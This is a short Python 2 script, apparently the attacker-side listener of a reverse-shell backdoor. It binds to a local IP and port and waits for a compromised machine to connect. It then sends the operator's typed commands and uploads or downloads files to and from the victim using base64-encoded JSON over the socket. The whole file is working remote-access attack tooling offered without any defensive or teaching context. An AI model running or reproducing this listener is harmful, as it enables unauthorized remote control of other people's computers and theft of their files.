#!/usr/bin/env python
import socket
from json import dumps, loads
import os
import base64
from colorama import init, Fore		# for fancy/colorful display

class Listener:
    def __init__(self, ip, port):
        self.colors()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((ip, port))
        s.listen(0)
        print('\n{}[+] Waiting for an incomming connections...{}'.format(self.GREEN, self.RESET))
        self.conn, addr = s.accept()
        print('\n{}[+] Connection has been establisted from {} '.format(self.Yellow, self.RESET) + "{}".format(self.RED) + str(addr[0] + "{}\n".format(self.RESET)))

    def colors(self):
        # initialize colorama
        init()
        # define colors
        self.GREEN = Fore.GREEN
        self.RED = Fore.RED
        self.Cyan = Fore.CYAN
        self.Yellow = Fore.YELLOW
        self.RESET = Fore.RESET

    def reliable_send(self, data):
        json_data = dumps(data)
        self.conn.send(json_data)

    def reliable_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.conn.recv(1024)
                return loads(json_data)
            except ValueError:
                continue

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return '\n{}[+] Download Successful {}\n'.format(self.GREEN, self.RESET)

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def execute_remotely(self, cmd):
        self.reliable_send(cmd)
        if cmd[0] == 'exit':
            self.conn.close()
            exit()
        elif cmd[0] == 'clear':
            os.system('clear')

        return self.reliable_recieve()

    def run(self):
        while True:
            command = raw_input('{} >> {}'.format(self.GREEN, self.RESET))
            command = command.split(' ')    # Make a list of commands here
            try:
                if command[0] == 'upload':      # read file
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)

                if command[0] == 'download' and '[-] Error' not in result:    # write file
                    result = self.write_file(command[1], result)

            except Exception:
                result = '\n{}[-] Error During Command Execution {}\n'.format(self.RED, self.RESET)

            print(result)


#===================================
my_listener = Listener('192.168.0.105', 4446)
my_listener.run()